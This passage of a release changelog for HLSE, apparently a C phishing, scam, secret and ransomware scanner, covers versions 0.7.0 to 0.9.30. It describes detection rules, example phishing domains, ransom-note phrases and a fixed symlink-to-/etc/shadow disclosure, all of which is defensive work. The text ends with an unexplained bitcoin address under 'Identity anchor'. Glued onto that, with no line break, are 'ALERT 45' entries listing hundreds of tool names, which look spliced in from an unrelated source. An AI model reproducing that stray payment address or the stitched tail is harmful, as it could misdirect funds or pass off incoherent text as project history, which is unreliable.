  finding detail. The fix also removes 5 lines of unnecessary shell loop.

## [0.9.30] — 2026-06-08

### Fixed
- **README "Test architecture" table had stale CLI integration count: 87 → 90**
  (docs). The table was last updated in GAP-J (0.9.12, 45→86) but three more
  tests were added since: two for GAP-Q (secret/email no-arg exit=2 regression,
  0.9.19) and one for GAP-R (SARIF relative-URI regression, 0.9.20). Updated
  count to 90 and added "SARIF relative URIs, no-arg exit=2" to the row's
  description. Docs-only — no code or detection change.

## [0.9.29] — 2026-06-08

### Fixed
- **`hlse_audit.c:240` for-loop accessed array index before bounds check**
  (code quality). The hosts-file scan lowercased an input string with
  `for (k = 0; p[k] && k < sizeof(lower) - 1; k++)`, testing `p[k]` before the
  bounds check on the output buffer. Although functionally correct (reading `p`
  never overflows; the bound check is on the output `lower`), cppcheck
  `--enable=portability` flagged it as `arrayIndexThenCheck`. Reordered to
  `k < sizeof(lower) - 1 && p[k]` to match the conventional bounds-first
  pattern. Zero behaviour change; cppcheck warning eliminated.

## [0.9.28] — 2026-06-08

### Fixed
- **Property test file header listed only P1–P7; implementation tests P1–P13**
  (docs; GAP-Z). When P8–P13 (HTML entity, zero-width Unicode, l33tspeak,
  Cyrillic/Greek homoglyph, combined, and full-width evasion) were added to
  `tests/hlse_property_tests.c`, the file's own header comment was not updated.
  A reader of the test file saw only 7 properties listed even though the suite
  enforces 13. Updated the file header to enumerate all 13 (now consistent with
  spec §4.1 added in 0.9.27). Docs-only — no code or detection change.

## [0.9.27] — 2026-06-08

### Fixed
- **Spec §4 did not enumerate the 13 text-detection property invariants**
  (docs; GAP-Y). Spec §7 stated `make test` runs "all suites + property + corpus +
  CLI integration" but never named what the property suite verifies. Added §4.1
  "Text-detection property invariants (P1–P13)" — a table listing all 13 formal
  guarantees (score monotonicity, bounds, determinism, case insensitivity,
  whitespace/HTML entity/zero-width/l33tspeak/Cyrillic/full-width evasion
  resistance, combined evasion, multilingual parity, and safe-corpus FP ≤ 5%).
  A spec reader can now verify what "property tests pass" means without reading
  the test source. Docs-only — no code or detection change.

## [0.9.26] — 2026-06-08

### Fixed
- **CONTRIBUTING.md carried stale test counts and an incomplete test-axis
  table** (docs; GAP-X). Three errors corrected:
  - "200+ tests" → "320+" (matches current measured total)
  - "All 7 suites" → "All 8 suites" (util_tests added in 0.9.12)
  - "100K random inputs" → "4 harnesses × 100K iterations" (matches GAP-I)
  The "Six-axis" section was retitled "Seven-axis" and the table extended
  from 4 rows to 7 to include Behavioral tests, CLI integration, and Fuzz
  harnesses — all of which previously had no guidance on when to add a test.
  Docs-only — no code or detection change.

## [0.9.25] — 2026-06-08

### Fixed
- **Spec §3.1 subcommand table listed wrong library function for `text`**
  (docs; SPECIFICATION.md §3.1, GAP-W). The table said `hlse_check_text`
  but the `text` subcommand was updated to call `hlse_scan()` in 0.9.15
  (GAP-N) to add embedded URL extraction. The table and purpose description
  are now aligned with the implementation. Docs-only — no code change.

## [0.9.24] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `scan_summary` terminator record** (docs + test;
  SPECIFICATION.md §5.2, GAP-V). `scan --json` emits a final
  `{"kind":"scan_summary","target":"...","files_scanned":N,"threats":N}`
  line after all per-finding records. Spec §5.2 mentioned streaming
  `scan` records but said nothing about the terminator. Documented it;
  also tightened the existing `--json scan with summary line` regression
  test to assert the `target` field.

## [0.9.23] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `target` field for `url`, `text`, and `protect`
  JSON output** (docs; SPECIFICATION.md §5.2, GAP-U). A strict per-kind
  audit (no implicit fields) revealed that `url`, `text`, and `protect` all
  emit a `target` string (scanned URL / text string / directory path) that
  was never mentioned in §5.2. The field is useful to consumers — it
  disambiguates which record belongs to which scan — so it is documented
  rather than removed. §5.2 is split to list `url`, `text`, and `protect`
  separately with their `target` fields; `network`, `esp`, and `email` (no
  `target`) remain grouped. Docs-only — no code or detection change.

## [0.9.22] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `paste` JSON `signals` field** (docs;
  SPECIFICATION.md §5.2, GAP-T). The `paste` kind emits an integer `signals`
  field (count of fired pastejacking signals) alongside `reasons`, but the
  §5.2 field inventory documented only `reasons`. Documented `signals` for
  consistency with `audit` (whose extra `hardening_index` integer is already
  documented). Audited all twelve `--json` kinds against §5.2; the other
  eleven match their inventories exactly. Docs-only — no code or detection
  change.

## [0.9.21] — 2026-06-08

### Added
- **CI workflows** (`.github/workflows/ci.yml`, `.github/workflows/codeql.yml`).
  The README claimed "CI enforces this with a privacy tripwire job" but no
  workflow files existed. Created:
  - `ci.yml`: three jobs — `build-and-test` (make all + test + check-warnings +
    asan-test), `cppcheck` (error gate with `--error-exitcode=1` + advisory-only
    informational run), and `privacy-tripwire` (strace captures URL/text/secret/
    package subcommands and asserts zero `socket()/connect()/bind()` syscalls).
  - `codeql.yml`: GitHub CodeQL C/C++ analysis with `security-and-quality`
    queries on push/PR to main plus weekly schedule.
  Both workflows target `main` and `claude/**` branches.

## [0.9.20] — 2026-06-08

### Fixed
- **SARIF `artifactLocation.uri` emitted absolute paths** (`hlse_core.c`
  `sarif_emit()`; SPECIFICATION.md §5.3). The `scan` subcommand's SARIF output
  used the full absolute `fullpath` as the URI value (e.g.
  `/repo/src/file.py`). GitHub code scanning and the SARIF standard require
  relative URIs (relative to the checkout root) so the tool can map findings
  back to source files. Fixed by stripping the scan root prefix from each path
  before passing it to `sarif_add()`, yielding URIs like `src/file.py`.
  Added regression test `SARIF: artifactLocation URIs are relative`
  (CLI integration suite now has 90 tests).

## [0.9.19] — 2026-06-08

### Fixed
- **`secret` and `email` subcommands returned exit=0 when invoked with no
  argument in non-interactive (CI/script) environments** (`hlse_core.c`;
  SPECIFICATION.md §3). Both subcommands used `!isatty(0)` to fall through to
  stdin reading when no argument was provided. In CI pipelines, stdin is not a
  tty even without a pipe, so they silently scanned empty input and exited
  clean. Fixed by requiring either an explicit text argument or the explicit
  `--stdin` flag; no argument at all now returns exit=2 with a usage error,
  consistent with `text`, `scan`, `protect`, `file`, and `package`.
- Added regression tests: `secret: no-arg exits 2` and `email: no-arg exits 2`
  (CLI integration suite now has 89 tests).

## [0.9.18] — 2026-06-08

### Fixed
- **`scan --json` `secret` records used `reasons` schema instead of
  `findings`** (`hlse_core.c` scan walker; SPECIFICATION.md §5.2, GAP-P).
  The spec §5.2 defines `kind=secret` as carrying
  `findings:[{type,description}]`. The standalone `secret` subcommand
  already emitted the correct structured schema; however the `scan` walker's
  JSON branch emitted a flat `reasons:["description string", ...]` array
  instead. Fixed the scan walker to emit
  `findings:[{"type":"...","description":"..."}]` objects, making all
  `kind=secret` records consistent across both code paths.

## [0.9.17] — 2026-06-08

### Fixed
- **SARIF rule definitions missing `security-severity`** (`hlse_core.c`
  `sarif_emit()`; SPECIFICATION.md §5.3, GAP-O). The SARIF output had
  `security-severity` on individual result objects but not on rule
  definitions, which GitHub code scanning requires to classify vulnerability
  severity. Added `"properties": { "security-severity": "X.X" }` to each
  rule (`secret`=9.0, `file-masquerade`=8.0, `phishing-url`=7.5). Also
  improved rule `shortDescription` text from the generic "HLSE X detector"
  to human-readable descriptions.

- **`scan --json` `url` records missing `reasons` field** (`hlse_core.c`
  scan walker; SPECIFICATION.md §5.2, GAP-O companion). When the `scan`
  directory walker found a phishing URL embedded in a source file, the
  human-readable output included the reason strings but the `--json` URL
  record did not emit `"reasons"`. Fixed to match the spec §5.2 requirement
  that `url` JSON objects carry `reasons:[...]`.

## [0.9.16] — 2026-06-08

### Fixed
- **`--stdin --json` dropped embedded URL scores** (`hlse_core.c`
  `stdin_mode()`; companion to GAP-N). The `--stdin --json` path had the
  identical bug as the `text`/auto-detect JSON paths fixed in 0.9.15:
  `hlse_check_text(line)` was called instead of reusing the `ScanResult`
  already computed by `hlse_scan(line)`, so text lines with embedded
  phishing URLs returned score=0 in JSON mode while human output showed
  the correct BLOCK.

### Changed
- **README docs**: property table corrected `P1–P12` → `P1–P13` (P13
  full-width Unicode evasion was already implemented and passing); CLI
  integration count updated 86 → 87.

## [0.9.15] — 2026-06-08

### Fixed
- **`--json text` dropped embedded URL scores** (`hlse_core.c`;
  SPECIFICATION.md §8, GAP-N). When a text message contained an embedded
  phishing URL (e.g. `"click https://paypa1.com/signin"`), the human-readable
  path called `hlse_scan()` (embedded URL extraction → score 60) but the
  `--json` path re-called `hlse_check_text()` alone, returning score 0 for
  the same input. Same flaw in the auto-detect JSON path. Both paths now
  reuse the `ScanResult` already computed by `hlse_scan()` to build the
  `TextVerdict` for JSON output. Regression guard added to CLI integration
  (now 87 tests). Man page `.TH` header version/date also updated.

- **Man page version frozen at 0.9.0** (`hlse.1`; SPECIFICATION.md §8,
  GAP-M). `.TH` header still read `"HLSE 0.9.0"` / `"2026-05-31"`, and the
  OPTIONS section omitted `-h | --help`. Updated header to `0.9.15` /
  `2026-06-08` and added the missing option entry.

## [0.9.14] — 2026-06-08

### Fixed
- **`-h | --help` absent from help output** (`hlse_core.c` `print_usage()`;
  SPECIFICATION.md §8, GAP-L). Spec §3.2 lists `-h`, `--help` as a global
  flag; all other 7 flags appeared in the "Options" block but `--help` did
  not self-reference. Added `%s -h | --help  Show this help` as the final
  option line (1 `printf` arg added; arg count in comment updated to 8).

## [0.9.13] — 2026-06-08

### Fixed
- **README C library API accuracy** (SPECIFICATION.md §8, GAP-K). The README
  claimed "29 functions exported in `libhlse.so`" but `nm -D libhlse.so`
  reports 35 (six additions since the original count: `hlse_esp_verify`,
  `hlse_audit_hardening_index`, `hlse_validate_crypto_address`,
  `hlse_is_high_entropy_benign_magic`, `hlse_shannon_entropy_str`,
  `hlse_text_action_for_score`). The code example also omitted `hlse_util.h`
  and six entry points (`scan_secrets`, `check_email_headers`,
  `check_crypto_swap`, `esp_verify`, `audit_hardening_index`, `validate_crypto`).
  The "All pure functions, thread-safe" note was inaccurate — filesystem/host
  functions (protect/audit/network) are process-level. Updated count to 35,
  added missing examples, corrected thread-safety note. Also updated spec §7
  fuzz description from `100K` to `4 × 100K`. Docs-only.

## [0.9.12] — 2026-06-08

### Fixed
- **README test-architecture accuracy** (SPECIFICATION.md §8, GAP-J). The
  per-suite counts in the "Test architecture" table had drifted from reality
  (Unit-URL 13→23, Unit-text 14→15, Property 60→64, Secrets 20→25,
  File/Audit 14→17, CLI integration 45→86), and the `util_tests` (14) and
  out-of-distribution corpus (25) suites were missing entirely. The Fuzz row
  predated GAP-I (one text harness → four). Refreshed all rows to measured
  counts, added the two missing suites, and updated the Fuzz row to `4 × 100K`.
  The at-a-glance `320+` floor was re-verified and still holds (≈339
  suite/corpus + in-distribution benchmark checks). Docs-only.

## [0.9.11] — 2026-06-08

### Added
- **Multi-module fuzz harnesses** (`tests/hlse_secrets_fuzz.c`,
  `tests/hlse_supply_fuzz.c`, `tests/hlse_file_fuzz.c`;
  SPECIFICATION.md §8, GAP-I). Previously `make fuzz` / `make fuzz-asan`
  covered only `hlse_text.c`; the five other parser modules had zero fuzz
  coverage. Three portable smoke-fuzz harnesses added — same pattern as the
  original: deterministic PRNG, signal-handler crash detection, score-range
  assertion, 100K iterations (10K under ASan):
  - `hlse_secrets_fuzz.c` — `hlse_scan_secrets`, `hlse_check_email_headers`,
    `hlse_check_crypto_swap`, `hlse_validate_crypto_address` (4 entry points;
    generators: random bytes, credential fragments, email headers, crypto addresses)
  - `hlse_supply_fuzz.c` — `hlse_check_package`, `hlse_check_paste`
    (generators: random bytes, typosquat-mutated names, pastejacking commands)
  - `hlse_file_fuzz.c` — `hlse_check_filename` (disk-free path; generators:
    random bytes, double-extension, bidi/control characters, social-engineering lures)
- `make fuzz` now runs all four harnesses sequentially; `make fuzz-asan` runs
  all four under ASan/UBSan. `make clean` removes all harness binaries.

## [0.9.10] — 2026-06-06

### Fixed
- **README accuracy** (SPECIFICATION.md §8, GAP-H). "Structured tests: 237" and
  "Binary size: 53 KB (dynamic), 932 KB (static)" had drifted — actual is ≈328
  checks across the suites + CLI integration, and ≈140 KB dynamic / ≈1.0 MB
  static-pie (stripped) after the feature and hardening work. Updated to a
  non-drifting `320+` and measured approximate sizes; dropped the brittle exact
  count from the `make test` comment. The detection/evasion examples, F1=1.000,
  and 0% FP claims were re-verified and are accurate.

## [0.9.9] — 2026-06-06

### Changed
- **Consistent JSON `action` band** (`hlse_core.c`; SPECIFICATION.md §5.2,
  GAP-G). Only 4 of 12 `--json` kinds (`url`, `text`, `protect`, `esp`) emitted
  the `action` band; the other 8 (`package`, `paste`, `network`, `secret`,
  `email`, `clipboard`, `audit`, `file`) plus the streaming `scan` records
  omitted it, forcing consumers to re-derive the band from `score`. Every
  score-bearing JSON object now carries `"action"` (from
  `hlse_action_for_score`). 10 CLI action-consistency tests added.

## [0.9.8] — 2026-06-06

### Fixed
- **Solana clipboard-swap detection** (`hlse_secrets.c`; SPECIFICATION.md §8,
  GAP-F). The header advertised crypto-swap support for "BTC, ETH, XMR, SOL,
  USDT" and the `CRYPTO_SOL` enum / `"SOL (Solana)"` name existed, but
  `detect_crypto_type()` had no Solana branch, so a Solana clipper swap was
  silently never flagged. Add a base58 32–44 Solana branch, evaluated last so
  the prefixed/fixed-length formats (BTC `1`/`3`, USDT `T`, ETH `0x`, …) keep
  precedence. Detection is confined to the clipboard-swap comparison and the
  (test-only) validator — it does not feed the URL/text path, so phishing/scam
  F1 is unaffected. Adds validate + swap regression tests.

## [0.9.7] — 2026-06-06

### Security
- **`scan` no longer follows symlinks** (`hlse_core.c`; SPECIFICATION.md §1,
  GAP-E). A second spec audit found the recursive directory walker classified
  entries with `stat()` (follows links) and read files with `fopen()` (no
  `O_NOFOLLOW`). A symlinked directory could make the scan escape the target
  tree (and risk symlink cycles); a symlinked file such as `x.env ->
  /etc/shadow` was opened and scanned for secrets, disclosing a file outside
  the scanned tree. Now classified with `lstat()` (symlinks become `S_ISLNK`
  and are skipped) and re-opened with `O_NOFOLLOW | O_NONBLOCK` + `S_ISREG`
  (TOCTOU defence), matching the hardened pattern already used in
  `hlse_file.c`, `hlse_audit.c`, and the ESP scan. Real in-tree files are still
  scanned; a regression test plus an ASan symlink-cycle test were added.

## [0.9.6] — 2026-06-06

### Added
- **Formal specification** (`docs/SPECIFICATION.md`): the CLI contract, scoring
  model, per-module behaviour, output schemas, design invariants, and a gap
  analysis. Writing it surfaced that several documented/library capabilities had
  no CLI access — resolved below.
- **`secret` subcommand**: scan a text argument or stdin for leaked credentials
  (`hlse_scan_secrets`), previously reachable only via a directory `scan`.
- **`email` subcommand**: email-header forensics (`hlse_check_email_headers`) —
  SPF/DKIM, Reply-To mismatch, display-name/BEC spoofing. Arg or `--stdin`.
- **`clipboard` subcommand**: crypto address-swap / clipper detection
  (`hlse_check_crypto_swap`, including the 0.9.3 vanity look-alike escalation),
  previously library-only.
- All three honour `--json`; `esp` (added in 0.9.4) plus the three new commands
  are now documented in `--help`/`print_usage`, the man page, and the README.

### Notes
- These are thin CLI wrappers over existing, tested library functions — no
  detection logic changed. 14 new CLI integration tests; ASan/UBSan clean
  (empty/large/binary stdin); strict warnings + cppcheck clean.

## [0.9.5] — 2026-06-05

### Added
- **Lynis-style hardening index** (`hlse_audit.c`): new
  `hlse_audit_hardening_index()` returns a 0..100 score where 100 = fully
  hardened (the complementary view of the finding-weighted risk score). The
  `audit` subcommand now prints `Hardening index: N/100 (hardened|good|fair|
  weak)` and exposes `hardening_index` / `hardening_band` in `--json audit`,
  giving the same at-a-glance posture signal Lynis provides. Stateless helper;
  no detection logic changed. (Research backlog #7.)

## [0.9.4] — 2026-06-05

### Added
- **EFI System Partition (ESP) integrity check** (`hlse_protect.c`, new `esp`
  subcommand): `hlse_esp_verify` walks the ESP (default `/boot/efi`) and flags
  `.efi` binaries containing high-specificity ransom/bootkit text. The legacy
  MBR check only covers BIOS boot; the live boot-level threat is UEFI bootkits
  (BlackLotus, Linux Bootkitty) that tamper with the ESP. Unlike the MBR scan,
  this uses only multi-word ransom-note phrases (`"all your files have been
  encrypted"`, `"pay bitcoin"`, …) — the MBR's generic single-word tokens
  (`decrypt`, `locked`) would false-positive inside legitimate multi-MB signed
  bootloaders. Read-only, never follows symlinks, depth- and count-bounded.
  `--json esp` supported. 6 CLI regression cases added.

### Notes
- ESP signature (Authenticode) validation is intentionally deferred: it cannot
  be done safely offline without a baseline, and a wrong implementation would
  risk false negatives. See `docs/RESEARCH_IMPROVEMENTS.md` #8.

## [0.9.3] — 2026-06-05

### Added
- **Clipboard clipper "vanity look-alike" signal** (`hlse_secrets.c`): when a
  same-type crypto address is swapped, `hlse_check_crypto_swap` now measures the
  shared leading/trailing characters between the original and the replacement.
  Real clipboard hijackers (per EthClipper, arXiv 2108.14004) grind a
  replacement that shares the victim address's ends so a glance misses the
  swap; a shared tail of 4+ chars between two *different* addresses is
  essentially impossible by chance. Such swaps now escalate from BLOCK (95) to
  ISOLATE (100) with an explanatory reason. Purely additive — detection is never
  weakened; addresses with no shared ends keep their existing score.

## [0.9.2] — 2026-06-05

### Added
- **IDN homograph detection via Punycode** (`hlse_core.c`): `xn--` labels are
  now decoded per RFC 3492 and analysed UTS-39 style. Cyrillic/Greek/Armenian
  homographs delivered as Punycode (which is pure ASCII and so invisible to the
  existing UTF-8 mixed-script check) are caught: a confusable-folded label that
  resembles a brand, or a label mixing Latin with another script, is flagged.
  `xn--pple-43d` (аpple), `xn--ggle-55da` (gооgle), `xn--pypl-53dc` (pаypаl) and
  `xn--mirosoft-gch` (miсrosoft) now score BLOCK. Legitimate single-script IDNs
  — `xn--mnchen-3ya` (münchen), `xn--wgv71a` (日本), `xn--e1afmkfd` (пример) —
  are deliberately **not** flagged, preserving the 0.0% false-positive posture.
  Closes the largest detection gap identified in `docs/RESEARCH_IMPROVEMENTS.md`
  (item #1). Pure C, no network, no new dependencies.

### Changed
- 7 IDN regression cases added to the in-binary `--self-test`; in- and
  out-of-distribution corpora remain F1 = 1.000; ASan/UBSan clean (including
  malformed Punycode); strict warnings and cppcheck clean.

## [0.9.1] — 2026-06-04

Security-hardening release. No detection-logic changes: in- and
out-of-distribution corpora remain F1 = 1.000 and all 237+ tests pass.

### Security
- **Exploit-mitigation build flags** (`Makefile`): the binaries are now
  compiled with `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=2`, and
  linked as PIE with Full RELRO, `BIND_NOW`, and a non-executable stack on
  Linux (`-static-pie` for the static target). Previously the security
  tool itself shipped with no hardening (`-O2 -Wall -Wextra`, empty
  `LDFLAGS`). macOS builds are unaffected (uname-guarded linker flags).
- **Symlink / special-file safety** (`hlse_file.c`, `hlse_audit.c`): file
  reads now use `O_NOFOLLOW | O_NONBLOCK` and require `S_ISREG` via
  `fstat()`. A symlink can no longer redirect a scan to an arbitrary file
  (e.g. `/etc/shadow`) and a FIFO/device node can no longer block the
  scanner. Brings both modules in line with `hlse_protect.c`.

### Changed
- **Bounded string construction** (`hlse_core.c`): replaced an unbounded
  `strcpy`/`strcat` pair in the homoglyph `ii→ll` path and the default
  path assignment with clamped `memcpy`/explicit writes. Behaviour is
  unchanged; removes latent overflow hazards.
- **DRY** (`hlse_util.c`): the benign high-entropy magic-byte table
  (ZIP/GZIP/JPEG/PNG/…) used by the ransomware entropy heuristic moved
  into a shared `hlse_is_high_entropy_benign_magic()`.
- **`hlse_scan` reason copy** (`hlse_core.c`): bound the copy loop by the
  source `Verdict.reasons` size instead of a mismatched literal.

### Added
- **Static analysis config** (`.clang-tidy`): a bugprone/cert/
  clang-analyzer check set for local runs
  (`clang-tidy hlse_*.c -- -I. -std=c99 ...`). Companion CI jobs — a
  cppcheck `error`-severity gate (with documented inline suppressions)
  and a CodeQL `security-and-quality` workflow for C — plus a
  `release.yml` version-gate fix are maintained alongside the
  repository's GitHub Actions workflows.
- **cppcheck-driven fixes** (`hlse_core.c`): bound the `hlse_scan`
  reason copy by the source `Verdict.reasons` size, and document a
  `legacyUninitvar` false positive with an inline suppression.

## [0.9.0] — 2026-05-31

### Added
- **DGA / high-entropy domain detection** (`hlse_core.c`): Shannon entropy
  + digit-ratio analysis flags algorithmically generated domains
  (`x7k2p9qzr4mw.com`). Grounded in published phishing-URL feature research;
  requires both high entropy and digit presence to avoid false positives on
  long brand names (stackoverflow, amazonwebservices).
- **Brand-hyphen phishing** — `paypal-verify.com`, `apple-support.net`
  flagged via brand + hyphen + security-word pattern.
- **Digraph homoglyph** — `arnazon.com` (rn→m), `vv→w` normalization.
- **New abused TLDs** — `.zip`, `.mov`, `.country`, and others added to the
  high-risk list.
- **BEC amplifiers** (`hlse_text.c`): authority+wire, secrecy+wire, and
  authority+secrecy+payment compound rules; expanded executive-title and
  secrecy phrasings. CEO-fraud messages now reach ISOLATE.
- **Full-width Unicode folding** — `ｕｒｇｅｎｔ` (U+FF01-FF5E) collapsed to
  ASCII before keyword matching.
- **Polyglot file detection** (`hlse_file.c`): image/archive magic bytes
  (GIF/JPEG/PNG/ZIP/GZIP) with an executable extension flagged as payload
  disguise.
- **Bidi-override filename detection** — U+202E (RLO), U+202D (LRO), and
  bidi isolates flagged independent of apparent extension; `file`
  subcommand now analyzes names even when the file is absent.
- **SARIF 2.1.0 output** — `--sarif scan <dir>` emits GitHub code-scanning
  compatible results with rule definitions and security-severity.
- **Shared utility module** (`hlse_util.c`): Shannon entropy and
  Damerau-Levenshtein consolidated from three duplicate copies (DRY).

### Changed
- **Secret scanner** now excludes placeholder/example/test keys
  (`AKIAIOSFODNN7EXAMPLE`, `your_api_key_here`, repetitive tokens),
  matching the false-positive reduction of gitleaks/TruffleHog without
  requiring network verification.
- **Ransomware entropy** check excludes known compressed/media formats by
  magic byte, eliminating false positives on directories of `.zip`/`.gz`/
  `.jpg` files (Shannon entropy cannot distinguish encrypted from
  compressed; magic-byte exclusion is the robust fix).
- `scan` now errors (exit 2) on a missing directory instead of reporting
  a clean result.

### Fixed
- Unterminated HTML entities (`U&#82GENT` without semicolon) now decoded
  like browsers do.
- CI workflow rebuilt to run the full test suite, strict warnings,
  sanitizers, fuzzing, coverage gate, and gitleaks (previously only ran a
  subset and referenced a nonexistent test file).

### Security
- Added `release.yml` that re-runs all gates before producing signed
  release artifacts; a release can no longer bypass CI.

## [0.8.0] — 2026-05-12

### Added
- **Protection module** (`hlse_protect.c`): 4 behavioral detection layers
  - Ransomware: Shannon entropy analysis, ransom note detection (14
    filenames), extension mutation (26 extensions), compound rules
  - Network drive: /proc/mounts CIFS/NFS detection, lateral movement amplifier
  - SMB server: canary honeypot files, Samba audit log analysis
  - MBR/GPT: boot signature check, first-instruction validation,
    bootkit string scan, boot code entropy analysis
- **Secrets module** (`hlse_secrets.c`): 3 detection layers
  - Credential scanner: AWS keys, GitHub PATs, Stripe keys, Slack tokens,
    SSH private keys, .env passwords, generic high-entropy secrets
  - Email header forensics: display-name vs From mismatch, Reply-To
    mismatch, SPF/DKIM/DMARC fail, free-email corporate impersonation
  - Clipboard crypto-swap: BTC/ETH/XMR/SOL/USDT address validation +
    swap detection
- Unified `hlse_scan` API — auto-detects URL vs text, runs both detectors
- `hlse_core.h` public header with ScanResult, Verdict types
- Apple-style zero-argument demo (`./hlse_core` with no args)
- `--version` / `-V` flag
- Empty input → meaningful error ("Nothing to scan")
- `protect` CLI subcommand with auto-detect (dir→ransomware, /dev/→MBR)
- JSON output for protect subcommand
- 14 protection tests + 20 secrets tests integrated into `make test`

### Changed
- `check_url` made static (internal only); `hlse_check_url` is the public API
- Library exports unified to `hlse_` prefix (19 symbols, no namespace pollution)
- `stdin_mode` rewritten to use `hlse_scan` (eliminated duplicate URL/text branching)
- Progressive disclosure: safe → 1 line, threat → detailed reasons

### Fixed
- Format-truncation warnings in hlse_secrets.c (display_name overflow)
- `memmem()` replaced with portable `memcmp` loop (macOS/musl compat)
- `system("rm -rf")` in tests replaced with `opendir/unlink/rmdir`
- Block comment terminated early by `/dev/*` glob in comment
- Stale build artifacts removed from outputs/

## [0.7.0] — 2026-04-29

First production release of the C reference implementation.

### Added
- 12 URL detectors (homoglyph, mixed-script, typosquat, suspicious TLD, etc.)
- 10 text signals + 4 amplifiers, multilingual EN/JP/ZH/KR
- JSON output, stdin pipe mode, text mode
- 45 property tests across 7 axes
- 18 + 18 corpus benchmark, F1=1.000
- libhlse.so shared library (~22 KB) for FFI
- Static binary build (~742 KB stripped)
- GitHub Actions CI: Linux+macOS × GCC+Clang
- Privacy tripwire CI job blocking network calls

### Bug fixes (TDD-driven discovery)

These bugs slipped through unit tests but were caught by property tests
or the corpus benchmark:

- **CONFUSABLES collision**: `paypa1.com` not detected because `('1','i')`
  came after `('1','l')`. Fixed: keep only `('1','l')`, expand digits.
- **Capital-I homoglyph**: `paypaII.com` undetected, str_tolower stripped
  the signal. Fixed: II→ll alternative form check.
- **Cyrillic homoglyph**: `mіcrosoft.com` undetected. Fixed: UTF-8 byte
  mapping for Cyrillic→ASCII collapse.
- **Wikipedia false positive**: `/wiki/Verify` flagged. Fixed: trusted-host
  allowlist requires ≥3 phishing-path matches.
- **Double counting**: `paypa1.com` scored 95 (homoglyph 45 + typosquat 50).
  Fixed: typosquat skips when homoglyph already fired.
- **str_to_lower mangled UTF-8**: applied tolower to high bytes. Fixed:
  ASCII bytes only (`< 0x80`).
- **normalize_whitespace mangled multibyte**: continuation bytes treated
  as whitespace. Fixed: detect UTF-8 sequence length, copy intact.
- **JP/ZH/KR keywords missed**: signal tables were EN-only. Fixed: full
  multilingual keyword tables + MATCH macro dispatching on first byte.
- **strtok_r segfault under -std=c11**: missing POSIX feature macro.
  Fixed: `-D_POSIX_C_SOURCE=200809L`.
- **Under-firing**: ransom/tech-support scored below ALERT threshold.
  Fixed: raised base_weight and per_hit_bonus on critical signals.

### Performance (in-process via libhlse.so)
- check_text short: 2.08 µs
- check_text long: 2.83 µs

### Privacy
- Zero network calls (CI-enforced)
- Zero environment reads
- Zero file I/O outside stdin/stdout

### Acceptance criteria (all PASS)
- recall ≥ 0.85 → 1.000
- FP rate ≤ 0.05 → 0.000
- F1 ≥ 0.85 → 1.000
- 72 tests green (27 unit + 45 property)

## Identity anchor

```
bitcoin:bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5
```- **ALERT 45 (cycle 329): hpc/mpi/gpu + pkgrepo/secscan primitives** — msub/showq/ompi_info; mpiicc/mpiicpc; rocprof/hipcc/nvprof; poudriere/smartpm; pdtm/mapcidr; uncover (flag-gated real word).
- **ALERT 45 (cycle 328): metrics/search/ctn/firmware/memory + bcc/trace/libbpf primitives** — vmauth/vmselect/vminsert/m3coordinator/m3query/m3collector/dalmatinerdb/akumuli/brubeck; wordbreaker; flintlock/ucontainer; sbattach/mkrlconf; jeprof; tcpconnlat/tcpdrop/biolatency/llcstat/slabratetop/softirqs/tplist/vfscount/javaflow/javagc/tclcalls/tclflow/tclstat; stapdyn/stapio; bpf_iter/bpf_asm. Dropped real-word collision: railcar.
- **ALERT 45 (cycle 327): voip/sdr/fax/ppp/sms + crypto/iot/lirc/serial primitives** — dahdi_cfg/dahdi_hardware/dahdi_maint/dahdi_speed/dahdi_test/hdlcgen/hdlcstress/hdlcverify/pattest/patlooptest/tones2wav/iptel; gr_plot/gr_plot_fft/gr_plot_iq/gr_plot_psd/grcc/gsm_ussd; probemodem/g3cat/capiinfo; pppstats/zntune/atmloop/atsig; kannel/atinout; namecoind/peercoind/primecoind/vertcoind/feathercoind/nearup/neard/devp2p; lora_pkt_fwd/basicstation/rumqtt; irrecord/ircat/irpty/mode2/pronto2lirc; tty0tty/interceptty/ttyspy/seyon/tatssy. Dropped real-word collisions: smug/sesh/moquette.
- **ALERT 45 (cycle 326): pdf/present/broadcast/ascii + stress/diststore/san + tpm/pkcs11/feeds/notes primitives** — pdfdraw/pdftops/pdfattach/pdffonts/pdfdiff/diffpdf/sioyek; catpoint/lookatme/decktape; ices0/ices2/ezstream/sc_serv; cbonsai/asciiquarium/aafire/asciiview/shelr/catimg/timg/uberzug; filebench/smallfile/mdtest/sg_dd/sg_map/sginfo/sktest/whdd/hackbench/schbench/dbench/fsmark/llstat/pvfs2/scstadmin/scst_local/fcoeadm/fcoemon/fcrls; tpm_version/eidenv/pamu2fcfg/podgrab/mashpodder/podboat/rawdog/howdoi/buku. Dropped real-word collisions: melted/bonnie/pinpoint. tpm2_* full family already covered.
- **ALERT 45 (cycle 325): retro/emulator + bbs/osm/backup + honeypot/ntpgps/moreutils/plan9 primitives** — z80asm/tniasm/uz80as/zmac/spectemu/scl2trd/tape2pulses/tape2wav/tapeconv/audio2tape/listbasic/raw2hdf/c1541/petcat/cartconv/cc1541/d64cbm/cbmlinetester/unadf/adf2disk/retro68/basiliskii/minivmac/aranym/linapple/catakig/pcem/quasii88/ep128emu/plus4emu/yape/tivars/hp11c/free42; echocfg/asc2ans/binkit/chksmb/gtkuseredit/indfactum/smbactiv/sqpack/fidoconf/fecfg2fc/fido2sq/linkedto/goldedplus/ifcico/bforce/wwiv/pcboard/planetiler/img2grd/amrecover/amlabel/amstatus; dionaea/kfsensor/fakeses/honeytrap/pepdf/malsub/drakvuf/malwarezoo/noriben/procdot/binee/ntptime/gpscat/lcdgps/gegps/ntpshmmon/gps2udp/gpscorrelate/qlandkartegt/ifne/isutf8/vidir/mkone/json2tsv/saait/libzahl. Dropped real-word collisions: vamos/thug/glance/plumber/holmdahl/nonpareil; pepDF lowercased.
